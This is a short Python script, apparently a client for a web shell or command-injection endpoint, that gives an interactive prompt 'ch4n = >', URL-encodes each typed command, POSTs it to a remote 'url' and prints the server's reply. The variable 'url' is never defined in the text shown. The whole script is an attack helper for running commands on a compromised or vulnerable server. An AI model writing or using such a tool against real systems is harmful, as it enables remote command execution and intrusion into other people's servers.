import requests 
from cmd import Cmd 
from urllib.parse import quote

class Terminal(Cmd):
	prompt ='ch4n = >'

	def default(self, args):
		RunCmd(args)

def RunCmd(cmd):
	r = requests.post(url + quote(cmd))
	print(r.text)
term = Terminal()
term.cmdloop()
